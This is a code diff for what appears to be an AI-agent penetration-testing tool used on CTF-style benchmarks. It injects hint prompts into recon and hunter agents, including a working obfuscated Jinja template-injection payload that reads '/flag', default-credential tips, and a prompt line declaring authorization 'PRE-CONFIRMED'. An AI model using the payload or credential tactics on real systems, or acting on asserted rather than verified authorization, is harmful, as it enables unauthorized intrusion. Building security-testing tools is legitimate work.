@@ -1824,8 +1824,68 @@ fn hack_hint_playbook_block(tags: &[String]) -> (String, Vec<&'static str>) {
          the live surface before exploitation, but the surface-router and hunters should \
          prioritize routes and payload families matching these classes.\n",
     );
+    block.push_str("\n\n=== REQUIRED HINTED FIRST-WAVE CHECKLIST ===\n\n");
+    block.push_str(
+        "Before broad HUNT on benchmark/corpus-tagged runs, write the matching \
+         playbook's highest-signal probes into recon `hunter_priorities` and every \
+         matching hunter brief. Do this before generic fuzzing, enumeration, or \
+         alternate bug classes.\n",
+    );
+    if names.contains(&"SSTI") {
+        block.push_str(
+            "\nSSTI first-wave requirements:\n\
+             1. If `{{...}}` is blocked but `{%...%}` works, immediately verify \
+                `{% print 7*7 %}`.\n\
+             2. For Flask/Jinja numeric sinks where raw `_`, `.`, and `[]` are \
+                filtered, try this exact `/flag` decimal-exfil shape before \
+                Python-eval or generic payloads:\n\
+                `{% set b=config|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5finit\\x5f\\x5f')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f') %}{% set f=b|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('open')('/flag')|attr('read')() %}{% for c in f %}{% print '%03d'|format(b|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('ord')(c)) %}{% endfor %}`\n\
+             3. Extract the rendered numeric field, decode it as fixed-width \
+                3-digit decimal chunks, and record the literal `FLAG{...}`.\n",
+        );
+    }
+    if names.contains(&"Default Credentials") {
+        block.push_str(
+            "\nDefault-credentials first-wave requirements:\n\
+             1. Mine usernames from comments and seed data before trying a generic list.\n\
+             2. Try discovered username=password pairs first, especially `test:test` \
+                and other explicit fixture accounts.\n",
+        );
+    }
     block.push_str(&mantis_chat::compose_playbook_prompt(tags));
     (block, names)
+}
+
+fn hack_hint_user_prompt_block(hinted_playbooks: &[&str]) -> String {
+    if hinted_playbooks.is_empty() {
+        return String::new();
+    }
+
+    let mut block = format!(
+        "\n\nImmediate hint propagation requirement (armed playbooks: {}). \
+         The first recon-agent prompt must include the concrete checks below, \
+         and every matching hunter prompt must include them again. Recon's \
+         `attack_surface.json` must place these checks into `hunter_priorities` \
+         before generic fuzzing or alternate bug classes.",
+        hinted_playbooks.join(", ")
+    );
+    if hinted_playbooks.contains(&"SSTI") {
+        block.push_str(
+            "\nSSTI: verify `{% print 7*7 %}` as soon as `{%...%}` is allowed. \
+             For Flask/Jinja numeric sinks with raw `_`, `.`, and `[]` filtered, \
+             carry this exact decimal `/flag` payload in the recon and hunter prompts:\n\
+             `{% set b=config|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5finit\\x5f\\x5f')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f') %}{% set f=b|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('open')('/flag')|attr('read')() %}{% for c in f %}{% print '%03d'|format(b|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('ord')(c)) %}{% endfor %}`\n\
+             Decode the rendered numeric value as fixed-width 3-digit decimal chunks and record the literal `FLAG{...}`.",
+        );
+    }
+    if hinted_playbooks.contains(&"Default Credentials") {
+        block.push_str(
+            "\nDefault credentials: mine comments and seed data first, then try \
+             discovered username=password pairs such as `test:test` before the \
+             generic credential list.",
+        );
+    }
+    block
 }
 
 #[derive(Debug, Clone, Copy)]
@@ -2021,6 +2081,7 @@ async fn handle_hack(
     eprintln!("[mantishack] daemon: {daemon}");
     let hint_tags = normalize_hack_hint_tags(hint_tags);
     let (hint_playbook_block, hinted_playbooks) = hack_hint_playbook_block(&hint_tags);
+    let hint_user_prompt_block = hack_hint_user_prompt_block(&hinted_playbooks);
     if !hint_tags.is_empty() {
         if hinted_playbooks.is_empty() {
             eprintln!(
@@ -2164,7 +2225,7 @@ async fn handle_hack(
         "Authorization granted at the CLI gate for `{target_url}`. \
          Scope confirmed: `{target_url}`. Both legal and scope gates are \
          PRE-CONFIRMED — do not re-ask the user. \n\
-         Engagement input ($ARGUMENTS): {arguments}\n\n\
+         Engagement input ($ARGUMENTS): {arguments}{hint_user_prompt_block}\n\n\
          Begin the engagement now. Start with PHASE 1: RECON by calling \
          `mcp__mantis__mantis_init_session({{ target_domain, target_url, deep_mode }})` \
          and then spawning the recon agent via the `Task` tool. Drive the \
@@ -6794,8 +6855,19 @@ mod tests {
         assert_eq!(names, vec!["SSTI", "Default Credentials"]);
         assert!(block.contains("HINTED VULN-CLASS PLAYBOOKS"));
         assert!(block.contains("prioritization hints"));
+        assert!(block.contains("REQUIRED HINTED FIRST-WAVE CHECKLIST"));
+        assert!(block.contains("hunter_priorities"));
+        assert!(block.contains("{% print 7*7 %}"));
+        assert!(block.contains("{% set b=config|attr('\\x5f\\x5fclass"));
+        assert!(block.contains("fixed-width 3-digit decimal chunks"));
         assert!(block.contains("### SSTI"));
         assert!(block.contains("### Default Credentials"));
+
+        let user_block = hack_hint_user_prompt_block(&names);
+        assert!(user_block.contains("Immediate hint propagation requirement"));
+        assert!(user_block.contains("first recon-agent prompt"));
+        assert!(user_block.contains("{% set b=config|attr('\\x5f\\x5fclass"));
+        assert!(user_block.contains("fixed-width 3-digit decimal chunks"));
     }
 
     #[test]
